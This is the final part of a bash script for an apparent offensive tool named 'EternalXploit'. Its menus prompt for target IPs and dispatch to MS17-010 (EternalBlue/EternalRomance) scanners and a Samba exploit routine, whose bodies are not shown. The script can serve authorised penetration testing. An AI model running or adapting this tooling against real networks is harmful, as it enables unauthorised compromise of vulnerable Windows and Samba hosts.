nmaptocsv -i $defdir/$nmap_path -f ip-fqdn-port-protocol-service-version-os-script -o $defdir/$nmaptocsv_result_ms17_010 >/dev/null 2>&1 
echo -e "$yellow""     Nmap MS17-010 result saved to $defdir/$nmaptocsv_result_ms17_010"
echo
echo
EternalXploit
elif [[ $exploit -eq 5 ]]
then
clear
logo
echo
echo -e "$red"'     **** '"$yellow"'MS17-010 EternalBlue SMB Remote Windows Kernel Pool Scanner'"$red"' ****'
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$yellow"'         '"$green"'192.168.1.1/24'
echo -e "$white"
read -p '     IP/IP Range: ' iptarget
eternalblue_scanner
EternalXploit
elif [[ $exploit -eq 6 ]]
then
clear
logo
echo
echo -e "$red"'     ****************' "$yellow"'MS17-010 Remote Code Execution Scanner '"$red"'**************'
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$yellow"'         '"$green"'192.168.1.1/24'
echo -e "$white"
read -p '     IP/IP Range: ' iptarget
eternalromance_scanner
EternalXploit
elif [[ $exploit -eq 0 ]]
then
clear
EternalXploit
else
clear
EternalXploit
fi
elif [[ $opts -eq 2 ]] 
then
clear
logo
echo -e "$white"
echo -e "$red"'            ********************'"$yellow"' Samba Exploit '"$red"'********************'
echo
echo
echo -e '     '"$red"'['"$yellow"'1'"$red"']'"$green"' Samba exploit'
echo -e '     '"$red"'['"$yellow"'2'"$red"']'"$green"' Nmap samba scanner'
echo
echo -e '     '"$red"'['"$yellow"'0'"$red"']'"$red"' Back'
echo
echo -e "$green"
read -p '     Please select exploit: ' exploit
if [[ $exploit -eq 2 ]]
then
clear
logo
echo
echo -e "$red"'       ***********************' "$yellow"'Nmap Samba Scanner '"$red"'***********************'
echo
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$yellow"'         '"$green"'192.168.1.1/24'
echo -e "$white"
read -p '     IP/IP Range: ' iptarget
samba_scanner
elif [[ $exploit -eq 1 ]]
then
clear
logo
echo
echo -e "$red"'      **************************' "$yellow"'Samba Exploit'"$red"' **************************'
echo
echo -e "$white"
echo -e "$yellow"'     Ex: '"$green"'192.168.1.1'
echo -e "$white"
read -p '     Target IP Address: ' iptarget
samba_exploit
elif [[ $exploit -eq 0 ]]
then
clear
EternalXploit
fi
elif [[ $opts -eq 0 ]] 
then
clear
exit
fi
else
checkfile
fi
}
main




